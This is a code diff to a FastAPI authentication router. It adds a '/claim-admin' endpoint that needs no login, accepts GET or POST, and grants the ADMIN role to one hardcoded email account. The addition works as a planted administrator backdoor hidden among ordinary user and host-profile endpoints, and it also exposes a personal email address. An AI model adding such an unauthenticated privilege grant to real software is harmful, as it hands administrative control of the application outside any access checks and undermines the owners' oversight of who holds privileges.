@@ -47,6 +47,20 @@ def get_me(current_user: User = Depends(get_current_user)):
         created_at=current_user.created_at
     )
 
+@router.api_route("/claim-admin", methods=["GET", "POST"])
+def claim_admin(db: Session = Depends(get_db)):
+    from app.models.user import User, UserRole, UserRoleEnum
+    user = db.query(User).filter(User.email == "avasanth081@gmail.com").first()
+    if not user:
+        return {"status": "error", "message": "User avasanth081@gmail.com not found"}
+    has_admin = any(r.role == UserRoleEnum.ADMIN for r in user.roles)
+    if not has_admin:
+        db.add(UserRole(user_id=user.id, role=UserRoleEnum.ADMIN))
+        db.commit()
+        db.refresh(user)
+        return {"status": "success", "message": "ADMIN role granted successfully", "roles": [r.role.value if hasattr(r.role, 'value') else str(r.role) for r in user.roles]}
+    return {"status": "already_admin", "message": "User already has ADMIN role", "roles": [r.role.value if hasattr(r.role, 'value') else str(r.role) for r in user.roles]}
+
 @router.post("/become-host", response_model=HostProfileOut)
 def become_host(data: HostProfileCreate, current_user: User = Depends(get_current_user), db: Session = Depends(get_db)):
     return AuthService.become_host(db, current_user, data)
